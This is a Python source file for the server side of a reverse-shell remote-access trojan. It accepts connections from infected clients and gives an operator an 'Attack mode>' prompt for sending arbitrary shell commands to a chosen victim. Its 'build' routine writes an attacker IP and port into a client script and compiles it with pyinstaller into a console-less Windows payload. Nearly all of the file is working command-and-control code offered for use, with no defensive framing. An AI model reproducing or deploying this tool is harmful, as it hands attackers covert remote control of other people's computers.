import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
import os

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

COMMANDS = {'help':['Shows this help'],
            'list':['Lists connected clients'],
            'select':['Selects a client by its index. Takes index as a parameter'],
            'quit':['Stops current connection with a client. To be used when client is selected'],
            'clear':['clear the terminal'],
            'exit':['Stops server and goes back to main menu.'],
            'build':['Builds a payload for you'],
           }

class MultiServer(object):

    def __init__(self):
        inip = input('Port: ')
        self.host = ''
        self.port = int(inip)
        self.socket = None
        self.all_connections = []
        self.all_addresses = []

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return


    def quit_gracefully(self, signal=None, frame=None):
        print('Quitting gracefully')
        try:
            self.socket.close()
        except Exception as e:
            print('Could not close server socket %s' % str(e))
        sys.exit()


    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def start_turtle(self):
        """ Interactive prompt for sending commands remotely """
        while True:
            cmd = input('Attack mode> ')
            if cmd == 'list':
                self.list_connections()
                continue
            elif 'select' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'exit' or cmd == 'Exit':
                    # queue.task_done()
                    # queue.task_done()
                    print('Exitting...')
                    print('Clients will reconnect once server is back up')
                    quit_safely()
                    break
                    
            elif cmd == 'help':
                self.print_help()
            elif cmd == '':
                pass
            elif cmd == 'cls' or cmd == 'clear':
                os.system('cls')
            elif cmd == 'build':
                build()
            else:
                print('Command not recognized')
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_target_commands(self, target, conn):
        """ Connect with remote target client 
        :param conn: 
        :param target: 
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception as e:
                print("Connection was lost %s" %str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

def replace_text_in_file_with_copy(file_path, old_text1, new_text1, old_text2, new_text2):
    try:
        # Create a new file name for the copy
        filename, file_extension = os.path.splitext(file_path)
        temp_filename = "client" + "_temp" + ".py"

        # Open the original file for reading
        with open(file_path, 'r') as original_file:
            # Read content from the original file
            content = original_file.read()

            # Create modified content by replacing old_text with new_text
            modified_content1 = content.replace(old_text1, new_text1)
            modified_content2 = modified_content1.replace(old_text2, new_text2)
        # Write modified content to the new file
        with open(temp_filename, 'w') as new_file:
            new_file.write(modified_content2)

        print(f"Successfully inserted data into client...")
    except Exception as e:
        print(f"Error occurred: {e}")

def quit_safely():
    """Shutdown the server gracefully without informing the clients."""
    print('Shutting down the server...')
    # Close the server socket
    # server.socket.close()
    # Exit the script
    PID = os.getpid()
    SSString = 'taskkill /f /PID ' + str(PID)
    os.system(SSString)

"""
# Example usage:
file_path = 'client.py'
old_text = '%ip%'
new_text = '%text%'

replace_text_in_file(file_path, old_text, new_text)
"""

def build():
    old_text1 = '%tempip%'
    old_text2 = '%tempport%'
    filepath = 'client.py'
    new_text1 = input('IP address: ')
    new_text2 = input('Port: ')
    
    replace_text_in_file_with_copy(filepath, old_text1, new_text1, old_text2, new_text2)
    print('Compiling...')
    os.system('pyinstaller --onefile --noconsole client_temp.py')
    print('Cleaning up...')
    os.system('del /f client_temp.py')
    os.system('rmdir /s /q build')
    os.system('del /f client_temp.spec')
    print('Done! You can find your payload in the dist folder!!!')

def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_turtle()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
